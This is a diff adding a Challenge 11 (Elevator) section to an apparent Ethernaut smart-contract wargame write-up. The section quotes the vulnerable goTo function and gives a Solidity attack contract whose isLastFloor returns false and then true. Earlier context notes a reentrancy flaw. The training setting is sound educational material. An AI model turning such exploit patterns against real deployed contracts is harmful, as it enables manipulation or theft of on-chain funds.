@@ -324,3 +324,56 @@ contract EthernautReentrancyAttack {
 }
 ```
 This contract is vulnerable to re-entracy attack as it's updating user balance after external contract call. So malicious can create a loop on withdraw function from 1st line to 3rd line and it will withdraw all the ether available on the contract.
+
+
+# 11. [Challenge 11: Elevator](https://ethernaut.openzeppelin.com/level/0xaB4F3F2644060b2D960b0d88F0a42d1D27484687)
+
+
+Tasks:
+- This elevator won't let you reach the top of your building. Right?
+
+**Solution:** \
+Vulnerable Code:
+```
+  function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) {
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    }
+  }
+```
+
+Attack Payload:
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import './Elevator.sol';
+
+contract ElevatorAttack {
+    Elevator public elevator;
+    bool result = true;
+
+    constructor(address _elevator) public {
+        elevator = Elevator(_elevator);
+    }
+
+    function isLastFloor(uint) external returns(bool) {
+        if(result == true) {
+            result = false; 
+        } else {
+            result = true; 
+        }
+        return result;
+    }
+
+    function callGoTo() public {
+        elevator.goTo(13);
+    }
+}
+```
+we created our own implementation of the `isLastFloor()` method because the building references an instance of `Building(msg.sender)`, our `ElevatorAttack` contract can be that reference, meaning our own `isLastFloor()` method can be used to return whatever we want our method returned false and then true in order to fulfull this level's requirements
+
+
